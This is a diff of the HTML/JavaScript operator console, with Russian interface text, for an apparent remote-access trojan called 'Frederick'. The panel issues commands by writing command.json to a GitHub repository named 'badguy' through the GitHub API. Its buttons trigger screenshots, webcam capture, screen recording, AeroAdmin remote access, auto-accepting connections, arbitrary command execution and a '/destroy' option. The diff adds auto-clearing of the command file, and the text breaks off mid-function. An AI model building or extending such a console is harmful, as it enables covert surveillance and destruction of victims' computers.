@@ -1,605 +1,648 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Frederick Control Panel</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #0a0a0a;
-            color: #00ff41;
-            min-height: 100vh;
-            padding: 20px;
-        }
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-        .header {
-            text-align: center;
-            padding: 20px;
-            border-bottom: 2px solid #00ff41;
-            margin-bottom: 30px;
-        }
-        .header h1 {
-            font-size: 2.5em;
-            text-shadow: 0 0 20px rgba(0, 255, 65, 0.5);
-            letter-spacing: 4px;
-        }
-        .header p {
-            color: #00cc33;
-            font-size: 0.9em;
-            margin-top: 10px;
-        }
-        .status-bar {
-            background: #111;
-            border: 1px solid #00ff41;
-            padding: 10px 20px;
-            border-radius: 5px;
-            margin-bottom: 20px;
-            display: flex;
-            justify-content: space-between;
-            flex-wrap: wrap;
-            gap: 10px;
-        }
-        .status-item {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 0.9em;
-        }
-        .status-dot {
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            display: inline-block;
-        }
-        .status-dot.online { background: #00ff41; }
-        .status-dot.offline { background: #ff0040; }
-        .status-dot.chaos { background: #ff6600; animation: pulse 0.5s infinite; }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Frederick Control Panel</title>
+  <style>
+    :root {
+      --bg: #080b10;
+      --surface: rgba(17, 24, 39, 0.78);
+      --surface-2: rgba(31, 41, 55, 0.8);
+      --line: rgba(148, 163, 184, 0.18);
+      --text: #e5f3ff;
+      --muted: #93a4b8;
+      --accent: #34d399;
+      --accent-2: #22d3ee;
+      --warning: #f59e0b;
+      --danger: #fb7185;
+      --shadow: 0 24px 70px rgba(0, 0, 0, 0.45);
+      --radius: 20px;
+    }
 
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
-        }
+    * { box-sizing: border-box; }
 
-        .grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 20px;
-        }
-        @media (max-width: 768px) {
-            .grid { grid-template-columns: 1fr; }
-        }
+    body {
+      margin: 0;
+      min-height: 100vh;
+      font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      color: var(--text);
+      background:
+        radial-gradient(circle at top left, rgba(34, 211, 238, 0.18), transparent 32rem),
+        radial-gradient(circle at top right, rgba(52, 211, 153, 0.14), transparent 28rem),
+        linear-gradient(135deg, #06080d 0%, #0d1220 48%, #071018 100%);
+      padding: 28px;
+    }
 
-        .panel {
-            background: #111;
-            border: 1px solid #333;
-            border-radius: 8px;
-            padding: 20px;
-        }
-        .panel h2 {
-            color: #00ff41;
-            font-size: 1.2em;
-            margin-bottom: 15px;
-            border-bottom: 1px solid #333;
-            padding-bottom: 10px;
-        }
+    button, input { font: inherit; }
 
-        .cmd-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
-            gap: 8px;
-        }
-        .cmd-btn {
-            background: #1a1a1a;
-            border: 1px solid #333;
-            color: #00ff41;
-            padding: 10px 15px;
-            border-radius: 4px;
-            cursor: pointer;
-            transition: all 0.3s;
-            font-size: 0.85em;
-            font-family: inherit;
-        }
-        .cmd-btn:hover {
-            background: #00ff41;
-            color: #0a0a0a;
-            border-color: #00ff41;
-        }
-        .cmd-btn.danger:hover {
-            background: #ff0040;
-            border-color: #ff0040;
-            color: #fff;
-        }
-        .cmd-btn.chaos-btn:hover {
-            background: #ff6600;
-            border-color: #ff6600;
-            color: #fff;
-        }
+    .app {
+      width: min(1240px, 100%);
+      margin: 0 auto;
+    }
 
-        .input-group {
-            display: flex;
-            gap: 10px;
-            margin-top: 10px;
-        }
-        .input-group input {
-            flex: 1;
-            background: #1a1a1a;
-            border: 1px solid #333;
-            color: #00ff41;
-            padding: 10px 15px;
-            border-radius: 4px;
-            font-family: inherit;
-        }
-        .input-group input:focus {
-            outline: none;
-            border-color: #00ff41;
-        }
-        .input-group button {
-            background: #00ff41;
-            color: #0a0a0a;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-weight: bold;
-        }
-        .input-group button:hover {
-            background: #00cc33;
-        }
+    .hero {
+      display: grid;
+      grid-template-columns: minmax(0, 1fr) auto;
+      gap: 20px;
+      align-items: center;
+      padding: 28px;
+      border: 1px solid var(--line);
+      border-radius: calc(var(--radius) + 8px);
+      background: linear-gradient(135deg, rgba(15, 23, 42, 0.9), rgba(8, 13, 22, 0.72));
+      box-shadow: var(--shadow);
+      backdrop-filter: blur(18px);
+      position: relative;
+      overflow: hidden;
+    }
 
-        .log-area {
-            background: #0a0a0a;
-            border: 1px solid #333;
-            border-radius: 4px;
-            padding: 10px;
-            max-height: 300px;
-            overflow-y: auto;
-            font-family: 'Courier New', monospace;
-            font-size: 0.8em;
-            line-height: 1.6;
-        }
-        .log-area .log-entry {
-            border-bottom: 1px solid #1a1a1a;
-            padding: 2px 0;
-        }
-        .log-area .log-entry .time {
-            color: #666;
-        }
-        .log-area .log-entry .type-info { color: #00ccff; }
-        .log-area .log-entry .type-success { color: #00ff41; }
-        .log-area .log-entry .type-error { color: #ff0040; }
-        .log-area .log-entry .type-command { color: #ffcc00; }
+    .hero::after {
+      content: "";
+      position: absolute;
+      inset: auto -20% -65% 25%;
+      height: 220px;
+      background: radial-gradient(circle, rgba(52, 211, 153, 0.18), transparent 62%);
+      pointer-events: none;
+    }
 
-        .media-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
-            gap: 10px;
-            margin-top: 10px;
-        }
-        .media-item {
-            background: #1a1a1a;
-            border: 1px solid #333;
-            border-radius: 4px;
-            padding: 10px;
-            text-align: center;
-        }
-        .media-item img {
-            max-width: 100%;
-            border-radius: 4px;
-        }
-        .media-item .label {
-            font-size: 0.7em;
-            color: #666;
-            margin-top: 5px;
-        }
+    .brand { position: relative; z-index: 1; }
+    .eyebrow {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 7px 11px;
+      border: 1px solid rgba(52, 211, 153, 0.28);
+      border-radius: 999px;
+      color: #bbf7d0;
+      background: rgba(5, 150, 105, 0.09);
+      font-size: 0.82rem;
+      margin-bottom: 14px;
+    }
 
-        .status-text {
-            color: #00ff41;
-            font-size: 0.9em;
-        }
-        .status-text.offline {
-            color: #ff0040;
-        }
+    h1 {
+      margin: 0;
+      font-size: clamp(2rem, 5vw, 4.2rem);
+      line-height: 0.95;
+      letter-spacing: -0.06em;
+    }
 
-        .file-browser {
-            background: #0a0a0a;
-            border: 1px solid #333;
-            border-radius: 4px;
-            padding: 10px;
-            max-height: 200px;
-            overflow-y: auto;
-            font-family: 'Courier New', monospace;
-            font-size: 0.8em;
-        }
-        .file-browser .file-item {
-            padding: 3px 5px;
-            cursor: pointer;
-            border-radius: 2px;
-            display: flex;
-            justify-content: space-between;
-        }
-        .file-browser .file-item:hover {
-            background: #1a1a1a;
-        }
-        .file-browser .file-item .size {
-            color: #666;
-        }
-    </style>
+    .subtitle {
+      max-width: 680px;
+      margin: 14px 0 0;
+      color: var(--muted);
+      font-size: 1rem;
+      line-height: 1.6;
+    }
+
+    .hero-actions {
+      position: relative;
+      z-index: 1;
+      display: flex;
+      gap: 10px;
+      flex-wrap: wrap;
+      justify-content: flex-end;
+    }
+
+    .btn {
+      border: 1px solid var(--line);
+      border-radius: 14px;
+      padding: 11px 14px;
+      color: var(--text);
+      background: rgba(15, 23, 42, 0.72);
+      cursor: pointer;
+      transition: 180ms ease;
+      min-height: 44px;
+    }
+    .btn:hover { transform: translateY(-1px); border-color: rgba(52, 211, 153, 0.5); }
+    .btn.primary { background: linear-gradient(135deg, var(--accent), var(--accent-2)); color: #03120d; border: none; font-weight: 750; }
+    .btn.ghost { color: var(--muted); }
+    .btn.warning { border-color: rgba(245, 158, 11, 0.3); color: #fde68a; }
+    .btn.danger { border-color: rgba(251, 113, 133, 0.3); color: #fb7185; }
+    .btn:disabled { cursor: not-allowed; opacity: 0.55; transform: none; }
+
+    .status-grid {
+      display: grid;
+      grid-template-columns: repeat(6, minmax(0, 1fr));
+      gap: 12px;
+      margin: 18px 0;
+    }
+
+    .metric {
+      padding: 16px;
+      border: 1px solid var(--line);
+      border-radius: var(--radius);
+      background: rgba(15, 23, 42, 0.64);
+      min-height: 92px;
+    }
+    .metric-label { color: var(--muted); font-size: 0.78rem; margin-bottom: 8px; }
+    .metric-value { font-weight: 800; font-size: 1.05rem; overflow-wrap: anywhere; }
+    .metric.online .metric-value { color: var(--accent); }
+    .dot {
+      width: 10px; height: 10px; border-radius: 50%; display: inline-block;
+      background: var(--accent); box-shadow: 0 0 0 6px rgba(52, 211, 153, 0.12);
+      margin-right: 8px;
+    }
+
+    .layout {
+      display: grid;
+      grid-template-columns: 1.05fr 0.95fr;
+      gap: 18px;
+      align-items: start;
+    }
+
+    .card {
+      border: 1px solid var(--line);
+      border-radius: var(--radius);
+      background: var(--surface);
+      box-shadow: 0 14px 40px rgba(0, 0, 0, 0.18);
+      backdrop-filter: blur(14px);
+      overflow: hidden;
+    }
+    .card + .card { margin-top: 18px; }
+    .card-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 12px;
+      padding: 18px 18px 0;
+    }
+    h2 { margin: 0; font-size: 1rem; letter-spacing: -0.02em; }
+    .card-note { color: var(--muted); font-size: 0.82rem; }
+    .card-body { padding: 18px; }
+
+    .command-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+      gap: 10px;
+    }
+
+    .command {
+      text-align: left;
+      padding: 14px;
+      border-radius: 16px;
+      border: 1px solid var(--line);
+      background: rgba(15, 23, 42, 0.6);
+      color: var(--text);
+      cursor: pointer;
+      transition: 180ms ease;
+      min-height: 82px;
+    }
+    .command:hover { border-color: rgba(34, 211, 238, 0.45); background: rgba(30, 41, 59, 0.8); }
+    .command strong { display: block; margin-bottom: 6px; }
+    .command span { color: var(--muted); font-size: 0.78rem; line-height: 1.35; }
+    .command.danger { border-color: rgba(251, 113, 133, 0.22); }
+    .command.danger strong { color: #fecdd3; }
+    .command.chaos { border-color: rgba(245, 158, 11, 0.3); }
+    .command.chaos strong { color: #fde68a; }
+
+    .input-row { display: grid; grid-template-columns: 1fr auto; gap: 10px; }
+    input {
+      width: 100%;
+      border: 1px solid var(--line);
+      border-radius: 14px;
+      color: var(--text);
+      background: rgba(2, 6, 23, 0.55);
+      padding: 12px 14px;
+      outline: none;
+      min-height: 44px;
+    }
+    input:focus { border-color: rgba(52, 211, 153, 0.55); box-shadow: 0 0 0 4px rgba(52, 211, 153, 0.08); }
+
+    .toolbar { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 12px; }
+
+    .log-area, .file-browser {
+      border: 1px solid var(--line);
+      border-radius: 16px;
+      background: rgba(2, 6, 23, 0.54);
+      overflow: auto;
+    }
+    .log-area { max-height: 360px; padding: 10px; font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.82rem; }
+    .log-entry { display: grid; grid-template-columns: 86px 1fr; gap: 10px; padding: 8px; border-radius: 10px; color: var(--muted); }
+    .log-entry:nth-child(odd) { background: rgba(148, 163, 184, 0.04); }
+    .time { color: #64748b; }
+    .type-success { color: var(--accent); }
+    .type-error { color: var(--danger); }
+    .type-command { color: #fde68a; }
+    .type-info { color: #7dd3fc; }
+    .type-warning { color: var(--warning); }
+
+    .media-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+      gap: 12px;
+    }
+    .media-item { border: 1px solid var(--line); border-radius: 16px; background: rgba(2, 6, 23, 0.44); overflow: hidden; }
+    .media-item img { display: block; width: 100%; aspect-ratio: 16 / 10; object-fit: cover; }
+    .media-item .label { padding: 10px; color: var(--muted); font-size: 0.78rem; overflow-wrap: anywhere; }
+
+    .file-browser { max-height: 260px; padding: 8px; font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.84rem; }
+    .file-item { display: flex; justify-content: space-between; gap: 12px; padding: 10px; border-radius: 12px; cursor: pointer; color: var(--text); }
+    .file-item:hover { background: rgba(148, 163, 184, 0.07); }
+    .size { color: var(--muted); white-space: nowrap; }
+
+    .empty { color: var(--muted); text-align: center; padding: 24px; }
+
+    @media (max-width: 980px) {
+      body { padding: 18px; }
+      .hero, .layout { grid-template-columns: 1fr; }
+      .hero-actions { justify-content: flex-start; }
+      .status-grid { grid-template-columns: repeat(3, minmax(0, 1fr)); }
+    }
+    @media (max-width: 640px) {
+      body { padding: 12px; }
+      .hero { padding: 20px; }
+      .status-grid { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+      .input-row { grid-template-columns: 1fr; }
+      .log-entry { grid-template-columns: 1fr; gap: 2px; }
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <h1>◈ FREDERICK</h1>
-            <p>Last Human · Last AI · Control Panel</p>
-        </div>
+  <main class="app">
+    <section class="hero">
+      <div class="brand">
+        <div class="eyebrow"><span class="dot"></span> Панель управления</div>
+        <h1>Frederick</h1>
+        <p class="subtitle">Полный контроль над последним ИИ. Отправляй команды, получай скриншоты, управляй системой.</p>
+      </div>
+      <div class="hero-actions">
+        <button class="btn primary" onclick="fetchStatus()">Обновить статус</button>
+        <button class="btn" onclick="fetchLogs()">Логи</button>
+        <button class="btn warning" onclick="clearCommands()">🗑️ Очистить команды</button>
+        <button class="btn ghost" onclick="clearToken()">Сбросить токен</button>
+      </div>
+    </section>
 
-        <div class="status-bar" id="statusBar">
-            <div class="status-item">
-                <span class="status-dot online" id="statusDot"></span>
-                <span id="statusText">Online</span>
-            </div>
-            <div class="status-item">
-                🖥️ <span id="pcName">-</span>
-            </div>
-            <div class="status-item">
-                🌐 <span id="ipAddress">-</span>
-            </div>
-            <div class="status-item">
-                🪟 Windows: <span id="windowCount">0</span>
-            </div>
-            <div class="status-item">
-                🔥 Chaos: <span id="chaosStatus">OFF</span>
-            </div>
-            <div class="status-item">
-                📡 Aero: <span id="aeroStatus">OFF</span>
-            </div>
-        </div>
+    <section class="status-grid" aria-label="Статус системы">
+      <div class="metric online"><div class="metric-label">Состояние</div><div class="metric-value"><span class="dot" id="statusDot"></span><span id="statusText">Online</span></div></div>
+      <div class="metric"><div class="metric-label">Компьютер</div><div class="metric-value" id="pcName">—</div></div>
+      <div class="metric"><div class="metric-label">IP</div><div class="metric-value" id="ipAddress">—</div></div>
+      <div class="metric"><div class="metric-label">Окна</div><div class="metric-value" id="windowCount">0</div></div>
+      <div class="metric"><div class="metric-label">Chaos</div><div class="metric-value" id="chaosStatus">OFF</div></div>
+      <div class="metric"><div class="metric-label">Aero</div><div class="metric-value" id="aeroStatus">OFF</div></div>
+    </section>
 
-        <div class="grid">
-            <div class="panel">
-                <h2>⚡ QUICK COMMANDS</h2>
-                <div class="cmd-grid">
-                    <button class="cmd-btn" onclick="sendCmd('/help')">/help</button>
-                    <button class="cmd-btn" onclick="sendCmd('/status')">/status</button>
-                    <button class="cmd-btn" onclick="sendCmd('/screen')">📸 Screenshot</button>
-                    <button class="cmd-btn" onclick="sendCmd('/cam')">📷 Webcam</button>
-                    <button class="cmd-btn" onclick="sendCmd('/vid 10')">🎥 Record 10s</button>
-                    <button class="cmd-btn" onclick="sendCmd('/vid 30')">🎥 Record 30s</button>
-                    <button class="cmd-btn chaos-btn" onclick="sendCmd('/chaos')">🔥 CHAOS</button>
-                    <button class="cmd-btn" onclick="sendCmd('/stop')">⏹ Stop</button>
-                    <button class="cmd-btn" onclick="sendCmd('/aero')">📡 AeroAdmin</button>
-                    <button class="cmd-btn" onclick="sendCmd('/accept')">🔓 Auto-Accept</button>
-                    <button class="cmd-btn" onclick="sendCmd('/stopaccept')">🔒 Stop Accept</button>
-                    <button class="cmd-btn danger" onclick="if(confirm('☠️ DESTROY SYSTEM?')) sendCmd('/destroy')">☠️ Destroy</button>
-                    <button class="cmd-btn danger" onclick="if(confirm('Shutdown Frederick?')) sendCmd('/shutdown')">⏻ Shutdown</button>
-                </div>
+    <section class="layout">
+      <div>
+        <article class="card">
+          <div class="card-header">
+            <h2>⚡ Быстрые команды</h2>
+            <span class="card-note">Полный доступ</span>
+          </div>
+          <div class="card-body">
+            <div class="command-grid">
+              <button class="command" onclick="sendCmd('/help')"><strong>/help</strong><span>Помощь</span></button>
+              <button class="command" onclick="sendCmd('/status')"><strong>/status</strong><span>Статус системы</span></button>
+              <button class="command" onclick="sendCmd('/screen')"><strong>/screen</strong><span>📸 Скриншот</span></button>
+              <button class="command" onclick="sendCmd('/cam')"><strong>/cam</strong><span>📷 Фото с камеры</span></button>
+              <button class="command" onclick="sendCmd('/vid 10')"><strong>/vid 10</strong><span>🎥 Запись 10с</span></button>
+              <button class="command" onclick="sendCmd('/vid 30')"><strong>/vid 30</strong><span>🎥 Запись 30с</span></button>
+              <button class="command chaos" onclick="sendCmd('/chaos')"><strong>/chaos</strong><span>🔥 Запустить хаос</span></button>
+              <button class="command" onclick="sendCmd('/stop')"><strong>/stop</strong><span>⏹ Остановить хаос</span></button>
+              <button class="command" onclick="sendCmd('/aero')"><strong>/aero</strong><span>📡 Запустить AeroAdmin</span></button>
+              <button class="command" onclick="sendCmd('/accept')"><strong>/accept</strong><span>🔓 Автопринятие</span></button>
+              <button class="command" onclick="sendCmd('/stopaccept')"><strong>/stopaccept</strong><span>🔒 Остановить автопринятие</span></button>
+              <button class="command danger" onclick="if(confirm('☠️ Уничтожить систему?')) sendCmd('/destroy')"><strong>/destroy</strong><span>☠️ Уничтожить</span></button>
+              <button class="command danger" onclick="if(confirm('Выключить Фредерика?')) sendCmd('/shutdown')"><strong>/shutdown</strong><span>⏻ Выключить</span></button>
             </div>
+          </div>
+        </article>
 
-            <div class="panel">
-                <h2>⌨️ CUSTOM COMMAND</h2>
-                <div class="input-group">
-                    <input type="text" id="customCmd" placeholder="Enter command..." onkeypress="if(event.key==='Enter') sendCustomCmd()">
-                    <button onclick="sendCustomCmd()">Send</button>
-                </div>
-                <div style="margin-top:10px;font-size:0.8em;color:#666;">
-                    Examples: /msg Hello, /command calc, /command notepad
-                </div>
+        <article class="card">
+          <div class="card-header">
+            <h2>⌨️ Кастомная команда</h2>
+            <span class="card-note">Любая команда</span>
+          </div>
+          <div class="card-body">
+            <div class="input-row">
+              <input id="customCmd" type="text" placeholder="Введите команду..." onkeydown="if(event.key==='Enter') sendCustomCmd()" />
+              <button class="btn primary" onclick="sendCustomCmd()">Отправить</button>
             </div>
-        </div>
-
-        <div class="panel" style="margin-top:20px;">
-            <h2>📊 RESULTS & LOGS</h2>
-            <div style="display:flex;gap:10px;margin-bottom:10px;">
-                <button class="cmd-btn" onclick="fetchLogs()">📜 Fetch Logs</button>
-                <button class="cmd-btn" onclick="fetchStatus()">📊 Fetch Status</button>
-                <button class="cmd-btn" onclick="fetchFiles()">📁 List Files</button>
-                <button class="cmd-btn" onclick="fetchScreenshots()">🖼️ Screenshots</button>
+            <div style="margin-top:10px;font-size:0.82rem;color:var(--muted);">
+              Примеры: /msg Hello, /command calc, /command notepad
             </div>
-            <div class="log-area" id="logArea">
-                <div class="log-entry" style="color:#666;">Ready. Send commands to Frederick...</div>
+          </div>
+        </article>
+
+        <article class="card">
+          <div class="card-header"><h2>📊 Результаты и логи</h2></div>
+          <div class="card-body">
+            <div class="toolbar">
+              <button class="btn" onclick="fetchLogs()">📜 Логи</button>
+              <button class="btn" onclick="fetchStatus()">📊 Статус</button>
+              <button class="btn" onclick="fetchFiles()">📁 Файлы</button>
+              <button class="btn" onclick="fetchScreenshots()">🖼️ Медиа</button>
             </div>
-        </div>
+            <div class="log-area" id="logArea"><div class="log-entry"><span class="time">—</span><span class="type-info">Готово. Панель загружена.</span></div></div>
+          </div>
+        </article>
+      </div>
 
-        <div class="panel" style="margin-top:20px;">
-            <h2>🖼️ MEDIA</h2>
-            <div class="media-grid" id="mediaGrid">
-                <div style="color:#666;grid-column:1/-1;text-align:center;">No media yet</div>
-            </div>
-        </div>
+      <div>
+        <article class="card">
+          <div class="card-header"><h2>🖼️ Медиа</h2><span class="card-note" id="mediaCount">0 файлов</span></div>
+          <div class="card-body"><div class="media-grid" id="mediaGrid"><div class="empty">Медиа пока нет</div></div></div>
+        </article>
 
-        <div class="panel" style="margin-top:20px;">
-            <h2>📁 FILES</h2>
-            <div class="file-browser" id="fileBrowser">
-                <div style="color:#666;">Loading...</div>
-            </div>
-        </div>
-    </div>
+        <article class="card">
+          <div class="card-header"><h2>📁 Файлы</h2><span class="card-note" id="fileCount">—</span></div>
+          <div class="card-body"><div class="file-browser" id="fileBrowser"><div class="empty">Нажмите «Файлы», чтобы загрузить список</div></div></div>
+        </article>
+      </div>
+    </section>
+  </main>
 
-    <script>
-        // ===== КОНФИГУРАЦИЯ =====
-        const GITHUB_OWNER = 'chotkof';
-        const GITHUB_REPO = 'badguy';
-        const COMMAND_FILE = 'command.json';
-        const RAW_URL = `https://raw.githubusercontent.com/${GITHUB_OWNER}/${GITHUB_REPO}/main/`;
+  <script>
+    const GITHUB_OWNER = 'chotkof';
+    const GITHUB_REPO = 'badguy';
+    const COMMAND_FILE = 'command.json';
+    const RAW_URL = `https://raw.githubusercontent.com/${GITHUB_OWNER}/${GITHUB_REPO}/main/`;
+    const CLEAR_INTERVAL_MS = 5 * 60 * 1000; // 5 минут
+    let githubToken = sessionStorage.getItem('frederick_github_token') || '';
+    let clearIntervalId = null;
 
-        // ===== СОХРАНЯЕМ ID В localStorage =====
-        function getCommandId() {
-            let id = parseInt(localStorage.getItem('frederick_command_id') || '0');
-            return id;
+    function getCommandId() {
+      return Number(sessionStorage.getItem('frederick_command_id') || '0');
+    }
+
+    function setCommandId(id) {
+      sessionStorage.setItem('frederick_command_id', String(id));
+    }
+
+    function clearToken() {
+      githubToken = '';
+      sessionStorage.removeItem('frederick_github_token');
+      addLog('info', 'Токен удалён.');
+    }
+
+    function getToken() {
+      if (githubToken) return githubToken;
+      const token = prompt('Введите GitHub token для этой сессии:');
+      if (!token) return '';
+      githubToken = token.trim();
+      sessionStorage.setItem('frederick_github_token', githubToken);
+      return githubToken;
+    }
+
+    function sanitize(text) {
+      return String(text).replace(/[&<>'"]/g, char => ({ '&':'&amp;', '<':'&lt;', '>':'&gt;', "'":'&#39;', '"':'&quot;' }[char]));
+    }
+
+    // ===== ОЧИСТКА command.json =====
+    async function clearCommands() {
+      const token = getToken();
+      if (!token) {
+        addLog('error', 'Токен не указан.');
+        return;
+      }
+
+      try {
+        addLog('info', '🗑️ Очистка command.json...');
+        
+        // Получаем текущий файл и SHA
+        let sha = null;
+        const readResp = await fetch(`https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${COMMAND_FILE}`, {
+          headers: { Authorization: `token ${token}`, Accept: 'application/vnd.github.v3+json' }
+        });
+
+        if (readResp.ok) {
+          const data = await readResp.json();
+          sha = data.sha;
+        } else if (readResp.status === 404) {
+          addLog('info', 'Файл уже пуст или не существует.');
+          return;
+        } else {
+          const err = await readResp.json().catch(() => ({}));
+          addLog('error', err.message || `Ошибка: ${readResp.status}`);
+          return;
         }
 
-        function setCommandId(id) {
-            localStorage.setItem('frederick_command_id', String(id));
+        // Очищаем файл (записываем пустой массив)
+        const payload = {
+          message: 'Clear commands (auto cleanup)',
+          content: btoa(unescape(encodeURIComponent(JSON.stringify([], null, 2)))),
+          sha: sha
+        };
+
+        const writeResp = await fetch(`https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${COMMAND_FILE}`, {
+          method: 'PUT',
+          headers: { Authorization: `token ${token}`, 'Content-Type': 'application/json', Accept: 'application/vnd.github.v3+json' },
+          body: JSON.stringify(payload)
+        });
+
+        if (writeResp.ok) {
+          addLog('success', '✅ command.json очищен.');
+          // Сбрасываем ID команд
+          sessionStorage.removeItem('frederick_command_id');
+          // Обновляем статус
+          setTimeout(fetchStatus, 1000);
+        } else {
+          const err = await writeResp.json().catch(() => ({}));
+          addLog('error', err.message || `Ошибка очистки: ${writeResp.status}`);
         }
+      } catch (error) {
+        addLog('error', error.message);
+      }
+    }
 
-        // ===== Отправка команды =====
-        async function sendCmd(cmd, retryCount = 0) {
-            const logArea = document.getElementById('logArea');
-            addLog('command', `➤ ${cmd}`);
+    // ===== АВТОМАТИЧЕСКАЯ ОЧИСТКА =====
+    function startAutoClear() {
+      if (clearIntervalId) {
+        clearInterval(clearIntervalId);
+      }
+      clearIntervalId = setInterval(() => {
+        addLog('info', '🔄 Автоочистка command.json...');
+        clearCommands();
+      }, CLEAR_INTERVAL_MS);
+      addLog('info', `⏱️ Автоочистка включена (каждые ${CLEAR_INTERVAL_MS / 60000} мин.)`);
+    }
 
-            let token = localStorage.getItem('github_token');
-            if (!token) {
-                token = prompt('Enter GitHub token:');
-                if (!token) {
-                    addLog('error', '❌ Token required');
-                    return;
-                }
-                localStorage.setItem('github_token', token);
-            }
+    // ===== ОТПРАВКА КОМАНДЫ =====
+    async function sendCmd(cmd, retryCount = 0) {
+      addLog('command', `➤ ${cmd}`);
+      const token = getToken();
+      if (!token) {
+        addLog('error', 'Токен не указан.');
+        return;
+      }
 
+      try {
+        let current = [];
+        let sha = null;
+        const readResp = await fetch(`https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${COMMAND_FILE}`, {
+          headers: { Authorization: `token ${token}`, Accept: 'application/vnd.github.v3+json' }
+        });
+
+        if (readResp.ok) {
+          const data = await readResp.json();
+          if (data.content) {
             try {
-                let current = [];
-                let sha = null;
-                
-                try {
-                    const shaResp = await fetch(`https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${COMMAND_FILE}`, {
-                        headers: { 
-                            'Authorization': `token ${token}`,
-                            'Accept': 'application/vnd.github.v3+json'
-                        }
-                    });
-                    
-                    if (shaResp.ok) {
-                        const data = await shaResp.json();
-                        if (data.content) {
-                            const decoded = atob(data.content);
-                            current = JSON.parse(decoded);
-                        }
-                        sha = data.sha;
-                    } else if (shaResp.status === 404) {
-                        current = [];
-                        sha = null;
-                    } else {
-                        const err = await shaResp.json();
-                        if (shaResp.status === 401 || shaResp.status === 403) {
-                            localStorage.removeItem('github_token');
-                            addLog('error', '❌ Token invalid, please re-enter');
-                            return sendCmd(cmd, retryCount + 1);
-                        }
-                        addLog('error', `❌ ${err.message || shaResp.status}`);
-                        return;
-                    }
-                } catch(e) {
-                    addLog('error', `❌ Read error: ${e.message}`);
-                    return;
-                }
-
-                // ===== ГЕНЕРИРУЕМ УНИКАЛЬНЫЙ ID =====
-                let commandId = getCommandId() + 1;
-                setCommandId(commandId);
-                
-                current.push({ id: String(commandId), cmd: cmd });
-
-                const payload = {
-                    message: `Command: ${cmd}`,
-                    content: btoa(unescape(encodeURIComponent(JSON.stringify(current, null, 2)))),
-                    sha: sha
-                };
-
-                const resp = await fetch(`https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${COMMAND_FILE}`, {
-                    method: 'PUT',
-                    headers: {
-                        'Authorization': `token ${token}`,
-                        'Content-Type': 'application/json',
-                        'Accept': 'application/vnd.github.v3+json'
-                    },
-                    body: JSON.stringify(payload)
-                });
-
-                if (resp.ok) {
-                    addLog('success', `✅ Command sent: ${cmd} (ID: ${commandId})`);
-                    setTimeout(fetchStatus, 2000);
-                } else {
-                    const err = await resp.json();
-                    const errorMsg = err.message || resp.statusText;
-                    addLog('error', `❌ Failed: ${errorMsg}`);
-                    
-                    if (errorMsg.includes('does not match') && retryCount < 3) {
-                        addLog('info', `🔄 Retry ${retryCount + 1}/3...`);
-                        await new Promise(resolve => setTimeout(resolve, 1000));
-                        return sendCmd(cmd, retryCount + 1);
-                    }
-                    
-                    if (resp.status === 401 || resp.status === 403) {
-                        localStorage.removeItem('github_token');
-                        addLog('error', '❌ Token invalid, please refresh');
-                    }
-                }
-            } catch(e) {
-                addLog('error', `❌ Error: ${e.message}`);
+              current = JSON.parse(atob(data.content));
+            } catch (e) {
+              current = [];
             }
+          }
+          sha = data.sha;
+        } else if (readResp.status !== 404) {
+          const err = await readResp.json().catch(() => ({}));
+          if ([401, 403].includes(readResp.status)) clearToken();
+          addLog('error', err.message || `Ошибка чтения: ${readResp.status}`);
+          return;
         }
 
-        function sendCustomCmd() {
-            const input = document.getElementById('customCmd');
-            const cmd = input.value.trim();
-            if (cmd) {
-                sendCmd(cmd);
-                input.value = '';
-            }
+        const id = getCommandId() + 1;
+        setCommandId(id);
+        current.push({ id: String(id), cmd: cmd });
+
+        const payload = {
+          message: `Command: ${cmd}`,
+          content: btoa(unescape(encodeURIComponent(JSON.stringify(current, null, 2)))),
+          ...(sha ? { sha } : {})
+        };
+
+        const writeResp = await fetch(`https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${COMMAND_FILE}`, {
+          method: 'PUT',
+          headers: { Authorization: `token ${token}`, 'Content-Type': 'application/json', Accept: 'application/vnd.github.v3+json' },
+          body: JSON.stringify(payload)
+        });
+
+        if (writeResp.ok) {
+          addLog('success', `✅ Команда отправлена: ${cmd} (ID: ${id})`);
+          setTimeout(fetchStatus, 1500);
+          return;
         }
 
-        function addLog(type, text) {
-            const logArea = document.getElementById('logArea');
-            const time = new Date().toLocaleTimeString();
-            const entry = document.createElement('div');
-            entry.className = 'log-entry';
